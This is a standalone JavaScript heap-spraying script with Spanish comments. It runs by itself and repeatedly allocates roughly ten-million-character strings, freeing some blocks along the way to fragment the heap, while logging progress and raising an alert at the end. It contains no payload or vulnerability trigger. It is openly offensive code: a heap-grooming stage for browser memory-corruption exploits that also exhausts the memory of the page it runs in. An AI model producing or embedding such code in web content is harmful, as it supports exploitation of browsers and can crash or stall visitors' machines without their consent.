(function() {
    const sprayArray = [];
    const largeObjectSize = 0x999999;  
    const iterations = 300;            

    async function fragmentedHeapSpray() {
        for (let i = 0; i < iterations; i++) {
            let largeObject = "A".repeat(largeObjectSize);
            sprayArray.push(largeObject);

            if (i % 20 === 0 && sprayArray.length > 50) {
                sprayArray.splice(0, 10);  // Eliminar bloques antiguos
                console.log(`[+] Iteración ${i + 1}: Liberados y reasignados bloques.`);
            }

            await new Promise(resolve => setTimeout(resolve, 50));
        }
        console.log("[+] Heap spraying con fragmentación compleja completado.");
        alert("Heap spraying fragmentado completado.");
    }

    fragmentedHeapSpray();
})();
